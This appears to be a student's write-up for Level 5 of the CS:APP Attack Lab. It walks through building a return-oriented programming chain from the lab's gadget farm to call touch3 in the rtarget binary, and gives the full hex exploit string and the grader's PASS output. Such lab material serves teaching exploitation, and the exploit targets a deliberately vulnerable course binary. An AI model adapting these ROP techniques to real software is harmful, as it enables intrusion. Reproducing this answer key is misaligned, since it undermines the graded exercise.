# CS:APP Attacklab Writeup
## Level 5
To attack, we must place the string somewhere in the stack.

However, how can we manage the stack correctly with the highly limited instructions provided?

Firstly, I think about pop 2 time in a row, so that there is space for the trailing 00 of a string.

However, the gadget farm doesn't provide such machine code.

Alternativly, I found we can manage to get an address with a leading 00:

```
00000000004019fc <setval_384>:
  4019fc:	c7 07 81 d1 84 c0    	movl   $0xc084d181,(%rdi)
  401a02:	c3                   	ret
```
Corresponding assembly code:
```
401a00: 84 c0 # testb %al
401a02: c3 # ret
```

However, the gadgets only provides instructions that pop the element on the top of the stack to register `%rax`,
which immediately overlapped the previously saved `%rsp`. The other given instructions involving `popq` is `popq %rsp`, 
obviously, using this instruction in pointless as it corrupts the stack top pointer.


```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret
```
Luckily, in gadget farm, there is a useful functions that provide possibility to perform arithmetic operations: functions `add_xy`.

Using this function, we can alter the saved `%rsp`, and by inserting correct paddings (no op instrcution addresses) into the input string, and finally call `touch3` correctly.

Here are some more related instructions that prepare for the call of `add_xy`:
```
0000000000401a5a <setval_299>:
  401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	ret
movq %rsp,%rax

401a06

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
movq %rax,%rdi
4019a2

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
movq %rax,%rdi
4019a2
```

Combining the codes above, we can devise a possible version of attack string:

```
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 45 14 11 45 14
11 11 11 11
06 1a 40 00 00 00 00 00 /* movq %rsp,%rax */
a2 19 40 00 00 00 00 00 /* movq %rax,%rdi */
d6 19 40 00 00 00 00 00 /* %rax = %rdi + %rsi */
a2 19 40 00 00 00 00 00 /* movq %rax,%rdi */
00 1a 40 00 00 00 00 00 /* nops */
00 1a 40 00 00 00 00 00 /* nops */
cc 19 40 00 00 00 00 00 /* popq */
35 39 62 39 39 37 66 61 /* Target String, (%rsp)+0x30 */
00 1a 40 00 00 00 00 00 /* nops */
00 1a 40 00 00 00 00 00 /* nops */
00 1a 40 00 00 00 00 00 /* nops */
00 1a 40 00 00 00 00 00 /* nops */
00 1a 40 00 00 00 00 00 /* nops */
00 1a 40 00 00 00 00 00 /* nops */
00 1a 40 00 00 00 00 00 /* nops */
FA 18 40 00 00 00 00 00 /* touch3 address */
```

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 11 11 11 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 1A 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 00 1A 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 
```